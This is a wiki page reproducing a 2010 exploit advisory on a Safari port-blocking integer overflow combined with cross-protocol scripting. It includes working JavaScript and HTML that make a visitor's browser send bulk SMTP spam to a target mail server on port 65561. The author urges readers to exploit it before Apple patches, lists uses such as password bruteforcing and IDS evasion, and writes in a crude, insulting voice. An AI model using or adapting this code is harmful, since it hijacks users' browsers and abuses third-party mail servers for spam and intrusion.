@@ -1,0 +1,144 @@
+Safari XPS Attack
+{{haxor}}
+[[Image:Goatse security.png|center]]
+<center><font size="5">[http://security.goatse.fr/ GOATSE SECURITY] TEAM 0-DAY EXPLOIT ADVISORY</font></center>
+<center>[irc://irc.hardchats.com/gnaa irc.hardchats.com #gnaa] to discuss security consulting arrangements.</center><br/>
+
+We at the Goatse Security labs have been delving into an old (but also new) class of web exploits originally coined cross-protocol scripting, but now more commonly referred to as inter-protocol exploitation. 
+
+Goatse Security has a double feature for you:
+*[[Safari]] browser port blocking bypassed by integer overflow ''(0-day vulnerability)''
+*XHR (XMLHttpRequest) as a vector for mail merging or wordlist attacks in XPS/IPE attacks ''(a technique that, as far as I know, has not been premiered before)''
+
+We're going to show you how these two methods combine like Voltron into a whole much larger than its parts. At the end of this short advisory, you will be able to take any Safari web browser and make it a spam drone, a wordlist-based logon cracker for networks, or a relay for payloads to arbitrary daemons. You will be able to do all of this without passing any shellcode or alerting any IDS to compromise. 
+
+Let's cover the bug.
+
+First, I would like to give credit to my cat, Gary C. Berries, as the initial researcher to uncover this bug. Without my cat's assistance as an enterprise class keyboard-based integer fuzzer this vulnerability would have been left unearthed.
+
+Apple is going to learn several lessons here, the most important of which is probably not to let an unsigned short pose as anything other than an unsigned short. Open up a Safari browser on your favorite operating system. Go to a "banned" port like 25 and you'll get an error:
+
+“Not allowed to use restricted network port” (WebKitErrorDomain:103) 
+
+Add 65536 to 25 to make 65561 and revisit the site on this new port-- no such cockblocking. You're good to go. You can now use the Safari web browser as a device to hit any port on any address with a cross-protocol scripting attack.
+
+<video type="vimeo" id="10302434" width="540" height="406" desc="Proof of Concept video #1" frame="true" position="center"/>
+
+'''List of Webkit-based browsers found to be affected''':
+*[[OS X]] Safari
+*[[iPhone]]/[[iPod]] Safari
+*[[iPad]] Safari (confirmed with iPad Simulator in SDK 3.2 beta 4 w/ XCode 3.2.2)
+*Arora
+*iCab
+*OmniWeb
+*Stainless
+
+'''The only Webkit-based browser found to not be vulnerable''':
+*[[Google]] Chrome
+
+For all Apple's talk of "think different" the only one actually doing so in regards to browser security is Google. XSS, XPS/IPE, all the traditional methods fail against Chrome. Google, I don't even care that you are the most ruthlessly evil corporation in existence anymore. Your stuff just works. You had me sold at functional reliability. There was a time in my life that I had large concern about corporate ethics. Now I know that all corporations are evil. Some more than others. The one who is evil and smart will only ruin you with malice, where the one that is evil and stupid can ruin you out of both malice and out of sheer incompetence.
+
+To give this exploit a little of that "je ne sais quoi", we need to come up with a good attack vector. Now we're going to show you how Apple didn't just unearth a decade-old vulnerability and make it viable again a la Microsoft, it actually becomes more viable to exploit in this new generation than it was at the time of its inception. When cross-protocol scripting was born, Javascript was pretty young. There wasn't a whole lot you could do with it then--any bits of Javascript now called AJAX wouldn't be a cross-browser standard until 2004.
+
+[[Image:Typicalipoduser.jpg|thumb|right|You know this thing is going to be dumb enough to click any link you send it.]]
+So I looked at this integer overflow and I thought to myself what exactly I'd find this useful for. The answers I came up with were:
+
+* Getting idiot Mac-using creative people at bulk mailing companies to click on links which spew SMTP envelopes at their internal mailserver, thereby utilizing someone else's email reputation to send CPA offers of my own.
+* Bruteforcing device passwords via a wordlist and then phoning home
+* Reflashing network devices with firmware more fun than the factory default
+* Relay exploit payloads to non-HTTP daemons on arbitrary TCP ports
+* Get a Safari web browser to do pretty much anything on any TCP port and not have any current IDS/IPS in existence be any wiser for it.
+
+We summarily implemented all of these things, but I'm going to show you how to do the first one since the code is trivially altered to do many of the others. Also because it is the most fun and easy way to monetize this particular vuln, and I'm hoping other people will make use of it before Apple patches!
+
+(The best part of [[Firefox XPS IRC Attack|our first cross-protocol scripting PoC release]] was seeing how many other people used it to summarily ruin every IRC network that exists. What can I say? I love being an enabler.)
+
+What you'll need:
+
+* A PoS web browser from [[Apple]]
+* An MTA that ignores synchronization and is error tolerant
+
+For the latter you may be asking, what MTA ignores synchronization? Well, more than one of them do out of the box. They generally cost five figs and are intended for the direct email marketing industry. I'd love to tell you which ones I got working but unfortunately I'm under NDA with them. Their software is really good and central to my business and I paid a metric ton of cash for it, so I would like to continue receiving updates and support and also not be sued. I asked for permission to mention their name in a Goatse advisory but they were none too pleased with the idea. So you will have to just make an educated guess. There are only so many pieces of SMTP software that will cost you the price of a decent car.
+
+Regardless, ignoring synchronization ain't exactly a bug, it is a feature. This advisory is not about who writes a good SMTP server for sending bulk! So, to initially send our first mail I tried a classic document.getElementById and a parentNode.submit(), but found this particular vector for XPS didn't work in Safari. So for the first wave of testing I used a multipart/form-data enctyped POST with a document.formname.submit. 
+
+<video type="vimeo" id="10383253" width="540" height="406" desc="Proof of Concept video #2" frame="true" position="center"/>
+
+So now that I know that its possible to send an email, I'll want to make a mass spam producing industrial asesmbly line out of this bitch. We'll want a silent and deadly bit of javascript in an innocuous page which continually refreshes a child iframe when it is done sending its current batch of emails, whilst the child will scrape mailing list and potentially other merge data from a function referenced from the parent node in the DOM tree.
+
+The parent document is gonna look something like this:
+<pre>
+<iframe src="/" id="m9"></iframe>
+
+<script>
+var i = 0;
+var emails;
+
+var xhr = new XMLHttpRequest();
+var url = "emails.php"
+xhr.open("GET", url, true);
+xhr.onreadystatechange = function() {
+    if (xhr.readyState == 4) {
+        emails = eval(xhr.responseText);
+        window.setInterval(function () {
+            var m = document.getElementById('m9');
+            m.src="m9.html";
+        }, 1000);
+    }
+};
+xhr.send(null);
+
+function getEmails() {
+var e = [];
+for (var x=0; x<10; x++) {
+   e[x] = emails[i++]
+}
+return e;
+}
+</script>
+</pre>
+
+While the child m9.html will look something like this:
+
+<pre>
+<form method="POST" enctype="multipart/form-data" action="http://target.mailserver:65561/" id="weevil"> 
+<textarea id="cmd" name="cmd" rows="4" cols="70">
+</textarea> 
+<br/><input type="submit" value="Submit"> 
+</form> 
+<script>
+
+email(parent.getEmails());
+
+function email(x) {
+    var cmd = document.getElementById('cmd');
+    cmd.value = "\nEHLO security.goatse.fr\n";
+    for (var i = 0; i < x.length; i++) {
+    cmd.value += "MAIL FROM:weev@security.goatse.fr\n";
+                        console.log(x[i]);
+    cmd.value += "RCPT TO: " + x[i] + "\nDATA\nSubject: JIZZTAPO\n14\n88\nRUINRUINRUINRUIN\nOKAY THIS MAIL IS OVER NOW\nLOL\n\n.\n\n\n";
+    }
+    cmd.value += "QUIT\n";
+    document.getElementById('weevil').submit();
+}
+</script>
+</pre>
+
+So, there you have it. XHR is practically like some sort of God-damned voodoo, and now that it's out of the box with unblocked ports I hope ya'll have fun with it before patch time. I know this particular advisory was a little TL;DR, but we're tired of people saying that this is all according to the HTTP RFC and XPS isn't a big deal or a vulnerability. If this is how web browsers are supposed to behave, all you security people have got a heap of trouble to look forward to.
+
+With love,
+
+:Escher Auernheimer (''[[weev]]'')
+:Analyst, Goatse Security.
+
+===Greets===
+*[[GNAA]]
+*My [[cat]], Gary C. Berries for being the initial discoverer of this vulnerability
+*g0udatron[gapp], Rucas, Jacksonbrown, [http://www.hephaestussec.com/ Hephaestus Security], sloth, Joseph Evers, girlvinyl, Sam Hocevar, The Unix Terrorist, notchill security
+*Jesus Christ the once and future king
+*All men who love merriment
+
+==See Also==
+*[[Firefox XPS IRC Attack]]
+
+[[Category:Drama-generating techniques]][[Category:Softwarez]][[Category:2010]]
